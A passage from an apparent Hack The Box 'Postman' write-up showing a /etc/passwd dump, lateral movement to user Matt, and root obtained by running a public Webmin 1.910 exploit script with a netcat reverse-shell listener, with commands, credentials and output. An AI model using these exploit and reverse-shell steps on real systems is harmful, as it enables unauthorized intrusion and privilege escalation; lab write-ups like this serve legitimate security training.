irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash
```
There are a few admin users - none of those worked. We also have Matt in the user's list. 

```console
root@kali:~/htb/postman# ssh matt@10.10.10.160
matt@10.10.10.160's password: 
Permission denied, please try again.
```

That didn't work. What if we can just su to Matt from Redis?

```console
redis@Postman:~$ su - Matt
Password: 
Matt@Postman:~$ id
uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
Matt@Postman:~$ ls
user.txt
Matt@Postman:~$ cat user.txt
517ad0****************8a2f3c
```

Boom. Onto to the next part.

## Root Flag

LinEnum didn't find any immediately apparently privlege escalation points. In looking back through those results and my initial scan, I remembered that there was port **10000** open as well. 

```console
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.910 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```
It appears to be some sort of webserver. I will head over to `10.10.10.160:10000` in my browser and see if there is anything interesting there.

![Port 10000](./images/port10000.png) 

A webserver running in SSL mode and telling me to use `https://Postman:10000` instead. Just clicking on the link didn't work, after some time googling how to access it via SSL I came up with having to add it to my `/etc/hosts` file.

```console
  GNU nano 4.5                                                /etc/hosts                                                 Modified  
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.160    htb.local
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.10.160 Postman
```

From there, I tried to re-access the site via firefox and lo and behold, a login page:

![Webmin Login](./images/webmin.png) 

So far for credentials we have two users and one password.
```
redis
Matt:computer2008
```
Lowest common denominator is that one of those should work here. Or perhaps some combination of easily guessable combination of `admin:password` or something.

![Webmin Admin](./images/webmin_admin.png) 

Exactly that - `Matt:computer2008` worked. Now what? Poking around it, the tool is saying that I have 60 packages ready to install and 32 of them are security updates. We also got the version of webmin from the nmap scan before - **1.910**. Searchsploit that:

```console
root@discovery:~/htb/postman# searchsploit webmin
------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                            |  Path
                                                                                          | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------ ----------------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                           | exploits/cgi/webapps/23535.txt
Webmin - Brute Force / Command Execution                                                  | exploits/multiple/remote/705.pl
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                               | exploits/linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                   | exploits/linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                        | exploits/linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                              | exploits/multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                        | exploits/multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                     | exploits/unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                   | exploits/cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                      | exploits/cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                    | exploits/linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                      | exploits/linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                         | exploits/linux/remote/47230.rb
Webmin 1.x - HTML Email Command Execution                                                 | exploits/cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP)                        | exploits/multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)                       | exploits/multiple/remote/2017.pl
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                          | exploits/php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                      | exploits/php/webapps/2451.txt
webmin 0.91 - Directory Traversal                                                         | exploits/cgi/remote/21183.txt
------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
```

We've got a juicy metasploit module for the version I am working with here, I am going to check that one out first, but I don't want to use metasploit. I am going to execute it as if I was taking OSCP and don't want to burn my one MSF shot.

I found a [python script](https://github.com/roughiz/Webmin-1.910-Exploit-Script) that looks like it accomplishes the same thing essentially. 

First I want to set up my listener:

```console
root@discovery:~/htb/postman# nc -lvnp 42069
listening on [any] 42069 ...
```
Then fire the exploit:

```console
root@discovery:~/htb/postman/Webmin-1.910-Exploit-Script# ./webmin_exploit.py --rhost 10.10.10.160 --lhost 10.10.14.75 -p computer2008 -u Matt -s True --lport 42069
****************************** Webmin 1.910 Exploit By roughiz*******************************
*********************************************************************************************
*********************************************************************************************
*********************************************************************************************
****************************** Retrieve Cookies sid *****************************************


********** [+] [Exploit] The Cookie is fac12ded5b9c551e7d38fbb16e06d876

********************************************************************************************
****************************** Create payload and Exploit ***********************************




********** [+] [Exploit] Verify you nc listener on port 42069 for the incomming reverse shell
```
and voila a shell as root:

```console
connect to [10.10.14.75] from (UNKNOWN) [10.10.10.160] 45778
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
a2577****************6ddce
```

# Conclusion

Overall that was a pretty fun machine. Root was incredibly easy even without using metasploit, looking back I should have tried to create my own exploit for it but for now I am pretty content in at least just not using metasploit. Initial foothold definitely took the cake as the most difficult step, however I think based on some missed data from what I thought was standard enumeration on previous boxes I've done I did not miss the Redis service which wasn't picked up in my first scan. 



